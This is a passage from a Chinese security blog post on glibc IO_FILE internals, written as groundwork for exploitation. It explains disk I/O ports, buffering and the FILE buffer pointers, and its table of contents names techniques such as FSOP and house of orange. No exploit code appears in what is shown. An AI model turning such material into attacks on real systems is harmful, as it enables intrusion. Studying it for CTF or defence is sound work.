<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="This article explains I/O fundamentals.">
<title>⚔️IO攻击之道</title>

<link rel='canonical' href='https://A1ester.github.io/p/%EF%B8%8Fio%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93/'>

<link rel="stylesheet" href="/scss/style.min.5c6952a17720c43e109641d7b396432543e55e1b35d4216a6f9b3a1f479e120d.css"><meta property='og:title' content="⚔️IO攻击之道">
<meta property='og:description' content="This article explains I/O fundamentals.">
<meta property='og:url' content='https://A1ester.github.io/p/%EF%B8%8Fio%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93/'>
<meta property='og:site_name' content='A1ester'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='markdown' /><meta property='article:tag' content='pwn' /><meta property='article:tag' content='IO' /><meta property='article:tag' content='周报' /><meta property='article:published_time' content='2026-02-10T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-02-10T00:00:00&#43;00:00'/><meta property='og:image' content='https://A1ester.github.io/p/%EF%B8%8Fio%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93/1.png' />
<meta name="twitter:title" content="⚔️IO攻击之道">
<meta name="twitter:description" content="This article explains I/O fundamentals."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://A1ester.github.io/p/%EF%B8%8Fio%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93/1.png' />
    <link rel="shortcut icon" href="/favicon.ico" />

  

<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<div class="loading">
    <div class="sharingon">
        <div class="ring">
            <div class="to"></div>
            <div class="to"></div>
            <div class="to"></div>
            <div class="circle"></div>
        </div>
    </div>
</div>

<style>
    .loading {
        position: fixed;
        display: none;
        justify-content: center;
        align-items: center;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 99;
        zoom: 3.0;
        background-color: #040404;
    }
	
    .animated-stop {
        animation-play-state: paused !important;
    }
	
    .scaleAndFadeout {
        animation: scaleAndFadeOut 1.5s forwards;
    }
	
     
    @keyframes scaleAndFadeOut {
        0% {
            transform: scale(1);
            opacity: 1;
        }
        100% {
            transform: scale(1.5);
            opacity: 0;
        }
    }

     
    .sharingon {
        position: relative;
        width: 6em;
        height: 6em;
        background-color: red;
        border: 6px solid black;
        animation: rot 1s ease-in-out infinite;
    }

    .ring {
        position: absolute;
        content: "";
        left: 50%;
        top: 50%;
        width: 3.5em;
        height: 3.5em;
        border: 4px solid rgb(110, 13 ,13 ,0.5);
        transform: translate(-50%,-50%);
    }

    .sharingon, .ring, .to,.circle {
        border-radius: 50%;
    }

    .to,.circle {
        position: absolute;
        content: "";
        width: 0.9em;
        height: 0.9em;
        background-color: black;
    }

    .to:nth-child(1) {
        top: -0.5em;
        left: 50%;
        transform: translate(-40%);
    }

    .to::before {
        content: "";
        position: absolute;
        top: -0.5em;
        right: -0.2em;
        width: 1.1em;
        height: 0.9em;
        box-sizing: border-box;
        border-left: 16px solid black;
        border-radius: 100% 0 0;
    }

    .to:nth-child(2) {
        bottom: 0.5em;
        left: -0.35em;
        transform: rotate(-120deg);
    }

    .to:nth-child(3) {
        bottom: 0.5em;
        right: -0.35em;
        transform: rotate(120deg);
    }

    .circle {
        top: 50%;
        left: 50%;
        transform: translate(-50%,-50%);
        box-shadow: 0 0 20px 1px;
        width: 1em;
        height: 1em;
    }

    @keyframes rot {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }
</style>

<script>	
    function initLoading() {
        const isFirstVisit = !sessionStorage.getItem('visited');
        if (isFirstVisit) {
            let loading = document.querySelector(".loading");
            loading.style.display = "flex";
            document.addEventListener('DOMContentLoaded', function() {
                
                loadFinish();
                
                setTimeout(() => {
                    loading.style.display = "none";
                }, 1000)
                sessionStorage.setItem('visited', 'true');
            });
        }
    }
	
    function loadFinish() {
        
        let sharingon= document.querySelector(".sharingon");
        sharingon.classList.add("animated-stop")
        
        let loading = document.querySelector(".loading");
        loading.classList.add("scaleAndFadeout")
    }
	
    initLoading();
</script>



    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "dark");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu17146313698374448001.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">🥱</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">A1ester</a></h1>
            <h2 class="site-description">(๑&gt;ᴗ&lt;๑) hello ~</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>主页</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>关于</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>归档</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>搜索</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%8F%8B%E9%93%BE/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>友链</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>暗色模式</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#base">📖Base</a></li>
    <li><a href="#io数据结构">⌨️IO数据结构</a></li>
    <li><a href="#数据操作">🛠️数据操作</a>
      <ol>
        <li><a href="#从硬盘中读入数据">从硬盘中读入数据</a></li>
        <li><a href="#向硬盘中写入数据">向硬盘中写入数据</a></li>
        <li><a href="#申请缓冲区">申请缓冲区</a></li>
      </ol>
    </li>
    <li><a href="#_io_file_jumps-函数操作">✍️<code>_IO_file_jumps</code> 函数操作</a>
      <ol>
        <li><a href="#_io_new_file_finish"><code>_IO_new_file_finish</code></a></li>
        <li><a href="#_io_new_file_overflow"><code>_IO_new_file_overflow</code></a></li>
        <li><a href="#_io_new_file_underflow"><code>_IO_new_file_underflow</code></a></li>
        <li><a href="#__gi__io_default_uflow_io_default_uflow"><code>__GI__IO_default_uflow</code>（<code>_IO_default_uflow</code>）</a></li>
        <li><a href="#__gi__io_default_pbackfail_io_default_pbackfail"><code>__GI__IO_default_pbackfail</code>（<code>_IO_default_pbackfail</code>）</a></li>
        <li><a href="#_io_new_file_xsputn"><code>_IO_new_file_xsputn</code></a></li>
        <li><a href="#__gi__io_file_xsgetn_io_file_xsgetn"><code>__GI__IO_file_xsgetn</code>（<code>_IO_file_xsgetn</code>）</a></li>
        <li><a href="#_io_new_file_seekoff"><code>_IO_new_file_seekoff</code></a></li>
        <li><a href="#_io_default_seekpos"><code>_IO_default_seekpos</code></a></li>
        <li><a href="#_io_new_file_setbuf"><code>_IO_new_file_setbuf</code></a></li>
        <li><a href="#_io_new_file_sync"><code>_IO_new_file_sync</code></a></li>
        <li><a href="#__gi__io_file_doallocate_io_default_doallocate"><code>__GI__IO_file_doallocate</code>（<code>_IO_default_doallocate</code>）</a></li>
        <li><a href="#__gi__io_file_read_io_file_read"><code>__GI__IO_file_read</code>（<code>_IO_file_read</code>）</a></li>
        <li><a href="#_io_new_file_write"><code>_IO_new_file_write</code></a></li>
        <li><a href="#__gi__io_file_seek_io_file_seek"><code>__GI__IO_file_seek</code>（<code>_IO_file_seek</code>）</a></li>
        <li><a href="#__gi__io_file_close_io_file_close"><code>__GI__IO_file_close</code>（<code>_IO_file_close</code>）</a></li>
        <li><a href="#__gi__io_file_stat_io_file_stat"><code>__GI__IO_file_stat</code>（<code>_IO_file_stat</code>）</a></li>
        <li><a href="#_io_default_showmanyc"><code>_IO_default_showmanyc</code></a></li>
        <li><a href="#_io_default_imbue"><code>_IO_default_imbue</code></a></li>
        <li><a href="#其他一些内容">其他一些内容</a>
          <ol>
            <li><a href="#flag标志位"><strong>flag</strong>标志位</a></li>
            <li><a href="#flush_io_do_flush"><strong>flush</strong>（<code>_IO_do_flush</code>）</a></li>
            <li><a href="#缓冲区设置宏">缓冲区设置宏</a></li>
            <li><a href="#虚表的初始化">虚表的初始化</a></li>
            <li><a href="#全部清空函数fflush">全部清空函数（<code>fflush</code>）</a></li>
            <li><a href="#fsop">FSOP</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#io_file相关结构体">🔗<code>IO_FILE</code>相关结构体</a>
      <ol>
        <li><a href="#猜想">猜想</a></li>
        <li><a href="#io_file-attack-之-fsop-libc-223--224">IO_FILE attack 之 FSOP (libc 2.23 &amp; 2.24)</a></li>
        <li><a href="#house-of-orange">house of orange</a></li>
        <li><a href="#io_file-attack-之-利用_fileno字段">IO_FILE attack 之 利用_fileno字段</a></li>
        <li><a href="#io_file-attack-之-任意读写">IO_FILE attack 之 任意读写</a></li>
        <li><a href="#global_max_fast的相关利用-house-of-corrosion">global_max_fast的相关利用 (house of corrosion)</a></li>
      </ol>
    </li>
    <li><a href="#虚表检测">🔍虚表检测</a>
      <ol>
        <li><a href="#虚表范围">虚表范围</a></li>
        <li><a href="#攻击_io_vtable_check">攻击<code>_IO_vtable_check</code></a></li>
        <li><a href="#外置虚表">外置虚表</a></li>
      </ol>
    </li>
    <li><a href="#宽字符跳表">🧭宽字符跳表</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
        <div style="height: 30%;width: 30%">
            <script type="text/javascript" id="clstr_globe" src="//clustrmaps.com/globe.js?d=xxxxx"></script>
        </div>
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/%EF%B8%8Fio%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93/">
                <img src="/p/%EF%B8%8Fio%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93/1_hu15498902436301297436.png"
                        srcset="/p/%EF%B8%8Fio%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93/1_hu15498902436301297436.png 800w, /p/%EF%B8%8Fio%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93/1_hu865906866735953193.png 1600w"
                        width="800" 
                        height="450" 
                        loading="lazy"
                        alt="Featured image of post ⚔️IO攻击之道" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/pwn/" >
                Pwn
            </a>
        
            <a href="/categories/io/" >
                IO
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/%EF%B8%8Fio%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93/">⚔️IO攻击之道</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            This article explains I/O fundamentals.
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Feb 10, 2026</time>
            </div>
        

        
    </footer>
    

    
</div>


<div class="article-details">
    ...
    <footer class="article-time">
        ...
        
        <div id="viewCount">
            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-eye"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" /><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6" /></svg>
            <time class="article-time--reading">
                
                <span id="vercount_value_page_pv">loading... </span>次
            </time>
        </div>
    </footer>
    ...
</div>
</header>

    <section class="article-content">
    
    
    <p>References：https://bbs.kanxue.com/thread-275969.htm</p>
<h1 id="base">📖Base
</h1><p>既然是IO操作，那么就有必要知道计算机到底是怎么读写硬盘或者其他设备的，此处主要以块设备为主。以硬盘为例，要想和硬盘交互，说白了也是和硬盘上的芯片+系统交互，在x86的体系下，其实就是和硬盘上的寄存器进行交互，为了让这个过程变的简单，硬盘上的寄存器被映射成了端口，硬盘的端口说明如下表。而能够交互端口的操作就是汇编指令中的<code>in out</code>，这些指令是特权指令，三环无法使用，像我们的常说的底层<code>read</code>或<code>write</code>函数其实也是靠操作系统执行<code>in，out</code>指令来实现外部设备读写的。具体的执行细节不是我们的重点，不再细写。需要知道的是，对于LBA硬盘来说，读写数据都必须一块一块的读，这也就是常说的块设备。</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:left">I/O地址</th>
<th style="text-align:left">读(主机从硬盘读数据)</th>
<th style="text-align:left">写(主机数据写入硬盘)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1F0H</td>
<td style="text-align:left">数据寄存器</td>
<td style="text-align:left">数据寄存器</td>
</tr>
<tr>
<td style="text-align:left">1F1H</td>
<td style="text-align:left">错误寄存器(只读寄存器)</td>
<td style="text-align:left">特征寄存器</td>
</tr>
<tr>
<td style="text-align:left">1F2H</td>
<td style="text-align:left">扇区计数寄存器</td>
<td style="text-align:left">扇区计数寄存器</td>
</tr>
<tr>
<td style="text-align:left">1F3H</td>
<td style="text-align:left">扇区号寄存器或 LBA 块地址 0~7</td>
<td style="text-align:left">扇区号或 LBA 块地址 0~7</td>
</tr>
<tr>
<td style="text-align:left">1F4H</td>
<td style="text-align:left">磁道数低 8 位或 LBA 块地址 8~15</td>
<td style="text-align:left">磁道数低 8 位或 LBA 块地址 8~15</td>
</tr>
<tr>
<td style="text-align:left">1F5H</td>
<td style="text-align:left">磁道数高 8 位或 LBA 块地址 16~23</td>
<td style="text-align:left">磁道数高 8 位或 LBA 块地址 16~23</td>
</tr>
<tr>
<td style="text-align:left">1F6H</td>
<td style="text-align:left">驱动器/磁头或 LBA 块地址 24~27</td>
<td style="text-align:left">驱动器/磁头或 LBA 块地址 24~27</td>
</tr>
<tr>
<td style="text-align:left">1F7H</td>
<td style="text-align:left">命令寄存器或状态寄存器</td>
<td style="text-align:left">命令寄存器</td>
</tr>
</tbody>
</table></div>
<blockquote>
<p>[!NOTE]</p>
<p>Ring 0（内核态）：最高特权级，操作系统内核、驱动程序运行于此，可以直接执行所有 CPU 指令，包括 <code>in</code>/<code>out</code> 这类 I/O 特权指令，直接操作硬件。</p>
<p>Ring 1、Ring 2：中间特权级，现代操作系统（如 Linux、Windows）基本不再使用，主要用于历史上的驱动或服务。</p>
<p>Ring 3（用户态 / 三环）：最低特权级，不能直接执行 <code>in</code>/<code>out</code> 这类硬件操作指令。</p>
</blockquote>
<h1 id="io数据结构">⌨️IO数据结构
</h1><p><u>对于LBA硬盘来说，读写数据都必须一块一块的读</u>，如果我们每次执行<code>read，write</code>时都是操作很少的数据，则对系统消耗非常大，因此，C库就想了一个好办法——缓冲区。所以，就比较好理解了，缓冲区是为了减少3坏操作外部硬件时的消耗产生的，一切都是以外部硬件为服务对象。</p>
<blockquote>
<p>[!NOTE]</p>
<p>LBA（Logical Block Addressing，逻辑块寻址），它把硬盘上的所有扇区（Sector）统一编号成一个从 0 开始递增的线性序列。</p>
<ul>
<li>每个扇区通常是 512 字节（或 4KB）。</li>
<li>操作系统只需要知道 “要访问第 N 个逻辑块”，而不用关心这个块在硬盘上的物理位置（如磁头、柱面、扇区）。</li>
<li>所以LBA 硬盘以 块（Block，通常是多个扇区）为最小读写单位，而不是单个字节。</li>
<li>这就是为什么操作系统和 C 库要引入缓冲区（Buffer），通过批量读写来减少 I/O 次数，提高效率。</li>
</ul>
</blockquote>
<blockquote>
<p>1.从外部硬件读取时。为了减少消耗，会一次从外部硬件读取一“块”数据，并放入缓冲区，然后当<code>target</code>需要时，再从头部慢慢读取，只到读完才再次从硬件读取。这个缓冲区叫输入缓冲区。</p>
<p>2.向外部硬件写入时。为了减少消耗，不会一有东西就写入，而是先将内容从<code>source</code>写入缓冲区，当缓冲区满了时候再将内存一起写入硬件。这个缓冲区叫输出缓冲区。</p>
</blockquote>
<p>为了更好的定位，对每个操作我们肯定至少要有3个基础数据。首先，以从外部硬件读取为例，我们要有输入缓冲区开始（base）、结尾（end）和当前（ptr）已经用了多少的指针。很明显当<code>ptr == end</code>时，说明输入缓冲区里的东西已经全部读完，需要重新从硬件读入。</p>
<p>同样，对于向外部硬件写入为例，我们要有输出缓冲区开始（base）、结尾（end）和当前（ptr）已经写了多少的指针。很明显当<code>ptr == end</code>时，说明输出缓冲区已经写满，可以向硬件写入了。</p>
<p>上面的内容看似非常清楚，但这里其实有一些比较容易混乱的地方。因为缓冲区内存储的是数据，输入、输出两者数据流动方向不同，但保护主体都一样，都是外部设备，所以<strong>有用的数据部分</strong>就有所不相同。</p>
<blockquote>
<ol>
<li>
<p>对于输入缓冲区<code>ptr-end</code>是有用的数据，<code>base-ptr</code>为已使用的数据。</p>
</li>
<li>
<p>对于输出缓冲区<code>base-ptr</code>是要写入硬件的内容（有用数据），<code>ptr-end</code>为空闲区域。</p>
</li>
<li>
<p>两者结尾有所不同。</p>
<p>(1)对于输入缓冲区，因为从硬盘中读取的数据可能无法填满整个缓冲区的块，所以<code>_IO_buf_end != _IO_read_end</code>。输入缓冲区要使用<code>_IO_read_end</code>判断结束。</p>
<p>(2)对于输出缓冲区，缓冲区的结束就是输出缓冲区结束，<code>_IO_buf_end == _IO_write_end</code>。输出缓冲区往往使用<code>_IO_buf_end</code>判断结束。</p>
</li>
</ol>
</blockquote>
<p>虽然，输入、输出缓冲区作用不同，但原理上都是一块内存。一块外部设备可能既可以写入也可以读取，为了节省空间，我们可以定义一块缓冲区，需要输入的时候就做输入缓冲区，需要输出就做输出缓冲区。那么我们就有了8个指针。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>  <span class="c1">// 缓冲区的基地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>   <span class="c1">// 缓冲区的结束地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span> <span class="c1">// 输入缓冲区基地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>  <span class="c1">// 输入当前位置
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>  <span class="c1">// 输入缓冲区结尾地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span><span class="c1">// 输出缓冲区基地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span> <span class="c1">// 输出当前位置
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span> <span class="c1">// 输出缓冲区结尾地址
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>那么到现在，基本思路理清了，其他就方便了.</p>
<blockquote>
<p>1）从文件中读取： 程序是从<code>fd</code>中读取一批数据到缓冲区中（<code>_IO_buf_base</code> 至 <code>_IO_buf_end</code>），<code>_IO_read_ptr</code> 指向已向<code>target</code>中写完的位置，既 <code>_IO_read_ptr</code> 至 <code>_IO_read_end</code> 为还没有写入<code>target</code>中的数据。当<code>_IO_read_ptr == _IO_read_end</code>时，说明输入缓冲区内已经没有可用数据，需要再次从文件中读入数据。</p>
<p>2）向文件输出： 程序是先将<code>source</code>中的数据写入到缓冲区中，<code>_IO_write_ptr</code> 指向已从<code>source</code>中写到的位置，既 <code>_IO_write_ptr</code> 至 <code>_IO_write_pend</code> 为还剩余的空间。当<code>_IO_write_ptr == _IO_buf_end</code>时，再全部写入<code>fd</code>中。</p>
</blockquote>
<h1 id="数据操作">🛠️数据操作
</h1><p>既然有了数据结构，我们就可以简单定义一些操作来进行操作。</p>
<h2 id="从硬盘中读入数据">从硬盘中读入数据
</h2><p>这个逻辑前面已经说的非常清楚，简单逻辑如下。</p>
<blockquote>
<ol>
<li>从<code>fd</code>中读取一批（一块）数据到输入缓冲区中（<code>_IO_buf_base</code> 至 <code>_IO_buf_end</code>），同时对<code>_IO_read_base</code> <code>_IO_read_ptr</code> <code>_IO_read_end</code> 设置初始值。（<code>_IO_read_ptr == _IO_read_base</code> ，当然也可能不同）</li>
<li>从<code>_IO_read_ptr</code> 处向需要的内存中复制数据，同时把<code>_IO_read_ptr</code> 向后移位。</li>
<li>当<code>_IO_read_ptr == _IO_read_end</code>时，说明缓冲区内已经没有可用数据，需要再次从文件中读入数据。冲入第一步。</li>
</ol>
</blockquote>
<h2 id="向硬盘中写入数据">向硬盘中写入数据
</h2><p>同理，操作逻辑如下。</p>
<blockquote>
<ol>
<li>先将<code>source</code>中的数据复制到输出缓冲区中，<code>_IO_write_ptr</code> 指向已写到的位置。</li>
<li>当<code>_IO_write_ptr == _IO_buf_end</code>时，将缓冲区中的内容全部写入<code>fd</code>中，并将<code>_IO_write_ptr</code>设置为 <code>_IO_write_base</code>，重复第一步。</li>
</ol>
</blockquote>
<p>上面的操作中，我们还忘了一个基本的问题：**缓冲区从哪里来？**其实缓冲区就是一块内存，可以在栈上、堆上、<code>libc</code>中，甚至随便<code>mmap</code>一块内存都可以，但不论怎么来，我们都需要这样一块区域，在此，我们借用<code>glibc</code>中在<code>malloc</code>的方法来申请缓冲区。那么我们还需要第三个操作。</p>
<h2 id="申请缓冲区">申请缓冲区
</h2><p>这个操作非常简单。</p>
<blockquote>
<p>申请一块缓冲区，并设置<code>_IO_buf_base</code>为开头，<code>_IO_buf_end</code>为结尾。</p>
</blockquote>
